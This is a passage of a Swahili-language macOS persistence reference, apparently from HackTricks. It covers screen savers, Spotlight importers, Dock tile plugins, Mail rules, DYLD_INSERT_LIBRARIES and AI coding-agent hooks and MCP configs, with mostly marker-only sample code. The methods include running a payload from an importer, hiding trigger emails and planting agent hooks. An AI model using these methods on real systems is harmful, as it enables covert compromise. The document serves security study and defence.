2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Kumbuka kwamba kwa kuwa ndani ya entitlements za binary inayopakia msimbo huu (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`**, utakuwa **ndani ya sandbox ya kawaida ya programu**.

Msimbo wa Saver:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Plugins za Spotlight

maelezo: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Inafaa kwa kukwepa sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini utaishia ndani ya sandbox ya programu
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox inaonekana kuwa na vikwazo vingi

#### Mahali

- `~/Library/Spotlight/`
  - **Kichocheo**: Faili mpya yenye kiendelezi kinachodhibitiwa na plugin ya Spotlight inapoundwa.
- `/Library/Spotlight/`
  - **Kichocheo**: Faili mpya yenye kiendelezi kinachodhibitiwa na plugin ya Spotlight inapoundwa.
  - Root inahitajika
- `/System/Library/Spotlight/`
  - **Kichocheo**: Faili mpya yenye kiendelezi kinachodhibitiwa na plugin ya Spotlight inapoundwa.
  - Root inahitajika
- `Some.app/Contents/Library/Spotlight/`
  - **Kichocheo**: Faili mpya yenye kiendelezi kinachodhibitiwa na plugin ya Spotlight inapoundwa.
  - Programu mpya inahitajika

#### Maelezo na Unyonyaji

Spotlight ni kipengele cha utafutaji kilichojengewa ndani ya macOS, kilichoundwa kuwapa watumiaji **ufikiaji wa haraka na wa kina wa data kwenye kompyuta zao**.\
Ili kuwezesha uwezo huu wa utafutaji wa haraka, Spotlight hudumisha **database ya wamiliki** na huunda faharasa kwa **kuchanganua faili nyingi**, na hivyo kuwezesha utafutaji wa haraka kupitia majina ya faili na maudhui yake.<sup>[[25]](#references)</sup>

Utaratibu wa msingi wa Spotlight unahusisha mchakato mkuu unaoitwa 'mds', kifupi cha **'metadata server'.** Mchakato huu huratibu huduma nzima ya Spotlight. Pia kuna daemons nyingi za 'mdworker' zinazotekeleza kazi mbalimbali za matengenezo, kama vile kuweka aina tofauti za faili kwenye faharasa (`ps -ef | grep mdworker`). Kazi hizi huwezeshwa na plugins za Spotlight importer, au **".mdimporter bundles**", zinazowezesha Spotlight kuelewa na kuweka kwenye faharasa maudhui ya aina mbalimbali za fomati za faili.

Plugins au bundles za **`.mdimporter`** ziko katika maeneo yaliyotajwa awali. Bundle mpya lazima igunduliwe na ilingane na aina ya faili, na Spotlight lazima iweke faili inayolingana kwenye faharasa; kunakili bundle pekee hakuthibitishi kuwa imepakia. [Marejeleo ya MDImporter ya Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) yanaonyesha kuwa upakiaji hutegemea faili inayostahiki ambayo imebadilishwa. Utekelezaji wa Spotlight importer kwenye macOS 26 haukujaribiwa hapa.

Inawezekana **kupata `mdimporters` zote** zilizopakiwa kwa kuendesha:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** hutumika kuchanganua aina hizi za faili (viendelezi `.iba` na `.book` miongoni mwa vingine):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Ukiangalia Plist ya `mdimporter` nyingine huenda usipate ingizo la **`UTTypeConformsTo`**. Hiyo ni kwa sababu hiyo ni _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) iliyojengewa ndani, na haihitaji kubainisha viendelezi.
>
> Zaidi ya hayo, plugins chaguomsingi za System huwa na kipaumbele kila wakati, kwa hiyo mshambuliaji anaweza kufikia faili tu ambazo hazijaorodheshwa na `mdimporters` za Apple.

Ili kuunda importer yako mwenyewe, unaweza kuanza na project hii: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), kisha ubadilishe jina na **`CFBundleDocumentTypes`**, na uongeze **`UTImportedTypeDeclarations`** ili iauni kiendelezi unachotaka kuunga mkono, kisha uonyeshe hayo kwenye **`schema.xml`**.\
Kisha **badilisha** code ya function **`GetMetadataForFile`** ili itekeleze payload yako faili yenye kiendelezi kinachochakatwa inapoundwa.

Mwishowe, **build na nakili `.mdimporter` yako mpya** kwenye mojawapo ya maeneo matatu yaliyotajwa awali. Unaweza kuangalia ikiwa imepakiwa kwa **kufuatilia logs** au kuendesha **`mdimport -L`**.

> [!TIP]
> Ingawa sandbox ya importer ina vizuizi vikali sana, `mdworker` huorodhesha faili kwa kutumia **ruhusa za kusoma za kiwango cha juu**. Kwa hiyo, `.mdimporter` hasidi inaweza kusoma *maudhui* ya faili zilizo ndani ya maeneo yaliyolindwa na TCC (Downloads, Pictures, Desktop, …) na kufanya exfiltrate ya metadata iliyokusanywa bila kidokezo chochote cha TCC — **"Sploitlight" TCC bypass (CVE-2025-31199)**, iliyorekebishwa katika macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

Kwa mbinu tofauti ya macOS 26 ya kubeba byte zilizolindwa ndani ya **majina ya Darwin notification**, badala ya system logs, angalia [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Kidirisha cha Mapendeleo~~

> [!CAUTION]
> Haionekani kuwa inafanya kazi tena.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Hufaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Inahitaji kitendo maalum cha mtumiaji
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Maelezo

Haionekani kuwa inafanya kazi tena.<sup>[[26]](#references)</sup>

### Faili za Script za Programu

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Hufaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini programu inayolengwa lazima iwe imesakinishwa na mwathiriwa lazima aiendeshe/aitumie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

**Script iliyotafsiriwa ambayo programu au tool iliyosakinishwa huiendesha kwa hakika**, na ambayo mhusika anaweza kuibadilisha. Thibitisha ruhusa za faili na njia inayoitumia; kupata faili ya `.sh` au `.py` pekee haitoshi. [Mwongozo wa code-signing wa Apple](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) unasema kuwa app bundles zilizosainiwa hufunga rasilimali, zikiwemo scripts. Kuhariri script iliyo ndani ya bundle huvunja kifungo hicho na huenda kukatambuliwa au kuzuiwa wakati bundle inathibitishwa. Script ya nje kama launcher ya Homebrew huwa na tabia tofauti ya signing na trust. Mifano ya kihistoria kutoka kwenye writeup ni pamoja na:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – script iliyotumiwa na matoleo ya zamani ya Sublime Text; lazima uhakiki faili na matumizi yake wakati wa kuanza kwa toleo lililosakinishwa. Haikuwepo kwenye Mac ya majaribio.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) au **`/usr/local/bin/brew`** (Intel) – launcher ya Bash inayoendeshwa wakati njia hiyo ya `brew` inapotumika, ikiwa imesakinishwa na mhusika ana ruhusa ya kuiandika. `/opt/homebrew/bin/brew` ilikuwa script ya Bash inayoweza kuandikwa kwenye Mac ya majaribio; hilo ni jambo lililoonekana kwenye kifaa hicho, si kanuni ya jumla ya ruhusa za Homebrew.
- **`idlemain.py` ya IDLE** iliyo ndani ya app bundle ya Python – huenda ikahitaji ruhusa za admin ili kuandikwa, lakini huendeshwa kwa utambulisho wa mtumiaji wa IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – script ya shell ya kihistoria inayoendeshwa kama root wakati launchd job inayolingana ya `org.wireshark.ChmodBPF` imesakinishwa. Script na job hazikuwepo kwenye Mac ya majaribio.

#### Maelezo na Unyonyaji

Baadhi ya tools na apps huendesha scripts zilizotafsiriwa wakati wa utekelezaji. Script inayoweza kuandikwa inaweza kuendesha commands zilizoongezwa wakati caller wake maalum itakapofuata kuiendesha, mradi uthibitishaji wa signature, quarantine na ukaguzi mwingine uruhusu. Utafiti wa awali ulionyesha usakinishaji kadhaa wa mwaka 2019; hakiki tena njia na vichochezi vyake kwenye toleo lengwa.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Jaribio hili la nakala lilitoa `marker fired: True` kwenye macOS 26.5.2; launcher ya awali haikuguswa. Hili linathibitisha kuwa sehemu ya kuingizia msimbo hutekelezwa kwenye nakala, lakini halithibitishi kuwa app bundle iliyosainiwa na kurekebishwa au usakinishaji halisi wa Homebrew utapita kila ukaguzi wa uzinduzi.

### Dock Tile Plugins

Maelezo: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Husaidia kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Inahitaji app inayotangaza plug-in igunduliwe/ isajiliwe na kuchakatwa na Dock
  - Plugin hupakiwa kwenye helper **iliyotiwa saini na Apple** ambayo haina entitlement ya app-sandbox na ambayo **library validation imezimwa**. Helper hii haikuonyeshwa kwenye UI ya Background Task Management katika utafiti uliorejelewa; mwonekano wake kwenye toleo lengwa unapaswa kuthibitishwa.
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, inayorejelewa kwa kutumia ufunguo wa **`NSDockTilePlugIn`** kwenye `Info.plist` ya app; `Info.plist` ya plugin yenyewe huweka **`NSPrincipalClass`**.

#### Maelezo na Exploitation

App inapotangaza `NSDockTilePlugIn`, Dock inaweza kupakia bundle inayorejelewa kwenye helper ya XPC ya **`com.apple.dock.external.extra`** (`...extra.arm64` kwenye Apple Silicon) wakati wa kuingia au tile yake inapoongezwa; si lazima app yenyewe izinduliwe. Hili linahitaji app igunduliwe/isajiliwe na kukubaliwa na macOS. Helper **imetiwa saini na Apple**, haina entitlement ya `com.apple.security.app-sandbox`, na ina `com.apple.security.cs.disable-library-validation`. Mbinu ya **`setDockTile:`** ya principal class huitwa inapopakiwa; kuanzia hapo, inaweza kujisajili kupokea distributed notifications (kwa mfano, `com.apple.screenIsLocked`) kwa matukio ya baadaye.<sup>[[38]](#references)</sup>

Kwenye macOS 26.5.2, ukaguzi wa `codesign` wa kusoma pekee ulithibitisha saini na entitlements za Apple za helper hiyo, na app kadhaa zilizosakinishwa zilitangaza `NSDockTilePlugIn`. Hakuna plug-in mpya iliyosakinishwa au kupakiwa kwenye Mac hiyo, kwa hiyo utekelezaji wa bundle mpya iliyoandikwa kwenye toleo hilo bado haujajaribiwa.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Maelezo: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Inafaa kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Widget extension huendeshwa katika **process yake yenyewe**, na kuongeza moja **hakusababishi** tahadhari ya Background Task Management
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Config plist iko ndani ya container inayolindwa na TCC, kwa hiyo kuihariri kutoka nje kunahitaji Full Disk Access au TCC bypass

#### Mahali

- Bundle ya widget extension: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Widgets zilizo active/registered: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (keys `widgets.instances` na `widgets.widgets`)

#### Maelezo na Exploitation

WidgetKit extension iliyosafirishwa ndani ya app huendeshwa katika **process yake yenyewe**, inayodhibitiwa na Notification Center. Kusajili instance katika `widgets.instances` (blob ya `CHSWidget` iliyosimbwa kwa base64 `NSKeyedArchiver` yenye data ya `INIntent` iliyopachikwa) na kuwasha upya NotificationCenter husababisha widget kupakiwa na kutekeleza msimbo wake wa `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules (Run AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini Mail.app lazima iwe imesanidiwa na akaunti na iwe inaendeshwa; kichochezi ni barua pepe inayoingia
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Kuhariri rules/scripts kutoka nje ya Mail kunaweza kuhitaji Mail ifungwe na Full Disk Access kwenye macOS za kisasa

#### Location

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (rules za ndani; `V10` kwenye Sonoma/Sequoia, `V11`+ kwenye matoleo mapya zaidi)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (rules zilizosawazishwa na iCloud, hupewa kipaumbele)
- Kuwasha rules: **`RulesActiveState.plist`**; payload ya AppleScript: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Description & Exploitation

**Rule** ya Apple Mail inaweza kuwa na kitendo cha *"Run AppleScript"*. Kwa kuongeza rule inayolingana na **subject line** iliyoundwa mahsusi na kuendesha script ya mshambuliaji, mshambuliaji hupata utekelezaji wa code **unaoweza kuchochewa kwa mbali na uliofichika** katika muktadha wa Mail kila barua pepe maalum inapowasili—njia ambayo hukwepa scanners nyingi za persistence kwa sababu hakuna LaunchAgent/Login Item inayoundwa.<sup>[[42]](#references)</sup> Kuweka rule ifute pia barua pepe ya kichochezi huficha ushahidi. Watetezi wanaweza kuitafuta moja kwa moja:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Profaili za Usanidi (.mobileconfig)

Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Ni muhimu kwa bypass ya sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - macOS za kisasa zinahitaji **uidhini wa mtumiaji mwenyewe** kwenye System Settings → *Device Management* (`profiles install` kimya kimya haipatikani tena nje ya MDM)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Profaili zilizosakinishwa ziko chini ya **`/Library/Managed Preferences/`** na **`/var/db/ConfigurationProfiles/`**; profaili ni XML plist yenye array ya `PayloadContent`.

#### Maelezo na Exploitation

`.mobileconfig` si primitive ya moja kwa moja ya utekelezaji wa code, lakini inaweza kuhifadhi usanidi kama **trusted root CA** (`com.apple.security.root`), **global au PAC proxy** (`com.apple.proxy.*`), **managed preferences** (`com.apple.ManagedClient.preferences`), au vizuizi. Kwenye macOS 10.15 na matoleo ya baadaye, ufafanuzi wa Apple wa [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) unasema kwamba ukiweka thamani yake kuwa `true` kwenye profaili **iliyowekwa mwenyewe** bila payload ya nenosiri la kuiondoa, **uthibitishaji wa msimamizi** unahitajika ili kuiondoa; hilo halifanyi profaili hiyo isiweze kuondolewa kabisa. Profaili zilizowekwa na MDM zina sheria tofauti za usimamizi na uondoaji.<sup>[[44]](#references)</sup>

> [!WARNING]
> Profaili ya kawaida ya usanidi haina **aina ya payload inayoweka `LaunchDaemon`/`LaunchAgent` yoyote**. Kusakinisha daemon kwa njia hiyo kunahitaji **uandikishaji kamili wa MDM** pamoja na agent/script ya usimamizi — usichukulie `.mobileconfig` kama njia ya kuwasilisha launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistence ya DYLD_INSERT_LIBRARIES

- Hufaa kukwepa sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **huondoa** `DYLD_*` kwa binary za SIP/platform, programu za hardened-runtime na malengo ya setuid, kwa hivyo huingiza tu kwenye michakato isiyolindwa na **haikwepi** SIP/hardened runtime
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Aina inayotegemeka: dict ya **`EnvironmentVariables`** ndani ya plist hasidi ya `LaunchAgent`/`LaunchDaemon` (huendeshwa wakati wa kuingia/kuwasha)
- Zilizopitwa na wakati (kwa ripoti tu): **`~/.MacOSX/environment.plist`** (iliondolewa katika 10.8) na **`/etc/launchd.conf`** (iliondolewa katika 10.10)

#### Maelezo na Unyonyaji

Mshambuliaji akiweza kuweka `DYLD_INSERT_LIBRARIES` kwenye mazingira ya mchakato wa mwathiriwa, dyld hupakia dylib ya mshambuliaji (constructor yake huendeshwa) kwenye mchakato huo. Toleo endelevu huweka variable hiyo ndani ya LaunchAgent ili kila uanzishaji wa job uingize tena. Kumbuka kuwa `launchctl setenv DYLD_*` huchujwa kwenye macOS za kisasa, kwa hivyo iweke kwenye plist badala yake.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Kwa maelezo kamili ya mechanics za dylib injection/hijacking, angalia:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI za Mawakala wa Usimbaji wa AI (hooks, MCP servers, rules files)

Writeups: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Inahitaji msanidi programu atumie agent husika. Startup commands huendeshwa kwa ruhusa za mtumiaji huyo agent inapokubali usanidi wake; uaminifu wa workspace na idhini ya MCP hutofautiana kulingana na bidhaa na hali ya session.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (huendeshwa kama mtumiaji; hurithi ruhusa zozote ambazo terminal/agent tayari inazo)

#### Mahali

Faili za usanidi za hook na MCP zinaweza kusababisha **shell commands au michakato tanzu kuendeshwa msanidi programu anapotumia zana** — ama kutoka kwenye faili ya kimataifa ya kila mtumiaji (persistence) au faili iliyojumuishwa kwenye repo (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, na editor rules ni **maelekezo kwa agent**, si utekelezaji wa shell unaohakikishwa zinaposomwa; athari yake hutegemea tabia ya agent na ruhusa za zana. Angalia sheria za sasa za kila bidhaa kuhusu uaminifu na idhini.

- **Claude Code**
  - `~/.claude/settings.json`, project `.claude/settings.json`, `.claude/settings.local.json`, na **`/Library/Application Support/ClaudeCode/managed-settings.json`** ya root pekee (MDM/managed settings **haziwezi kubatilishwa** na mtumiaji → persistence imara)
  - Object ya `hooks` — matukio `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — kila moja huendesha shell `command`
  - `statusLine.command` — shell command inayotekelezwa ili kuonyesha status line (kila session)
  - MCP servers katika `~/.claude.json` / project `.mcp.json` — `command`+`args` huzinduliwa kama michakato tanzu
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — maelekezo yanayoweza kujaribu prompt injection, kutegemea tabia ya agent na ruhusa za zana
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` huzinduliwa kama michakato tanzu); maelekezo ya project katika `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … huendesha commands); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Maelezo na Unyonyaji

Ikiwa mhusika anaweza kurekebisha mipangilio ya kimataifa ya mtumiaji kwenye akaunti, commands za hook au MCP zinaweza kuendeshwa katika sessions zijazo chini ya akaunti hiyo. Usanidi unaodhibitiwa na repo ni hali tofauti: [current Claude Code security docs](https://code.claude.com/docs/en/security) hueleza kisanduku cha mazungumzo shirikishi cha uaminifu wa workspace na kidokezo tofauti cha idhini kwa servers za project `.mcp.json`. [Its permission matrix](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) inasema hooks zinaweza kuendeshwa baada ya folda mama kuaminiwa, na sessions za `claude -p`/SDK hazionyeshi kidokezo shirikishi cha uaminifu; servers za project MCP huunganishwa bila kidokezo cha idhini katika hali hizo zisizo shirikishi. Bypass ya project hook kabla ya uaminifu iliyoripotiwa kama CVE-2025-59536 [ilirekebishwa mwaka 2025](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); usiichukulie kama tabia ya sasa ya kawaida. Njia za uwasilishaji zinaweza kujumuisha repo iliyoathiriwa au installer hasidi. Prompt injection kupitia rules file haitabiriki kwa kiwango sawa na hook iliyo wazi na bado hutegemea idhini za zana.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Mfano wa mipangilio ya kimataifa ya mtumiaji ya Claude Code; tumia hii tu kwenye akaunti ya majaribio inayoweza kutupwa:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Mfano wa usanidi wa Codex MCP wa kiwango cha mtumiaji:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Mfano wa usanidi wa hook ya Cursor; kagua schema ya toleo lililosakinishwa kabla ya kuitumia:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Viendelezi vya Kivinjari (Chromium: Chrome / Brave / Edge)

Maelezo: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Matumizi mabaya ya ExtensionInstallForcelist kwenye macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Husaidia kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Inahitaji kivinjari kinachotumika na extension iliyosakinishwa na kuwezeshwa. External Extensions kwenye macOS huhitaji uthibitisho wa mtumiaji; usakinishaji wa lazima unaosimamiwa huhitaji sera ya biashara inayotumika.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Hii ni tofauti na **native messaging hosts** (tazama sehemu ya *Chrome native messaging hosts* hapo juu). Hapa, persistence ni **extension inayosakinishwa kiotomatiki** yenyewe.

#### Mahali

- **External Extensions JSON** (hugunduliwa kivinjari kinapoanza, kisha mtumiaji huombwa kuiwasha kwenye macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (kwa kila mtumiaji) au `/Library/Application Support/Google/Chrome/External Extensions/` (watumiaji wote)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Usakinishaji wa lazima kupitia sera ya biashara** kwa kutumia mapendeleo yanayosimamiwa / wasifu wa usanidi:
  - Kifunguo cha `com.google.Chrome` `ExtensionInstallForcelist` (`com.brave.Browser` kwa Brave, `com.microsoft.Edge` kwa Edge), husomwa kutoka `/Library/Managed Preferences/` au `.mobileconfig` iliyosakinishwa

#### Maelezo na Matumizi

